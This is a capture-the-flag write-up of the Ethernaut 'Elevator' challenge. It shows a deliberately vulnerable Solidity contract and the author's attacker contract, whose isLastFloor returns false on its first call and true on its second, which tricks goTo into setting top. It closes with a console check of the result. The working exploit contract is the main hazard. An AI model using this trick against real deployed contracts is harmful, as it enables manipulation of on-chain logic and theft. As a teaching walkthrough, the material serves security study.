# Elevator

> This elevator won't let you reach the top of your building. Right?

> Things that might help:
> * Sometimes solidity is not good at keeping promises.
> * This Elevator expects to be used from a Building

```solidity
pragma solidity ^0.4.18;

interface Building {
  function isLastFloor(uint) view public returns (bool);
}

contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}
```

This one gave me a bit of trouble, although the game lists it as easier than challenges 5, 6 and 7.

The idea here is: the first `if` needs to get a `false` from the `isLastFloor` function, but the second needs to get `true`.

Wait a minute: `isLastFloor` is a `view` function, which means that:

> Functions can be declared view in which case they promise not to modify the state.```

How can we possibly make it return a different value while receiving the same argument if `isLastFloor` cannot modify state?

The answer is intuitive: we can't! There must be a way to modify state, even in `view` functions.

So I deployed this contract in Remix, setting `victim` to our instance's address:

```solidity
pragma solidity ^0.4.18;

contract Elevator {
  function goTo(uint _floor) public;
}

contract Caller {
    Elevator k;
    bool called;

    function isLastFloor(uint) public view returns (bool) {
        if(!called) {
            called = true;
            return false;
        } else {
            return true;
        }
    }

    function Caller(address victim) public {
        k = Elevator(victim);
    }

    function attack() public {
        called = false;
        k.goTo(1);
    }
}
```

The idea is simple: 
1. We deploy the Caller contract;
2. We call `attack`, which calls `goTo`. `goTo` calls `isLastFloor` and by then `called` is false, thus returning `false` and changing `called` to `true`;
3. `goTo` then calls `isLastFloor` again. Since `called` is `true`, now it returns `true`, setting our `top` correctly.

Let's check it then:

```javascript
await contract.top()
```

To my surprise it worked! Apparently Solidity does not enforce the write restriction on `view` functions, which may be used in many evil ways.
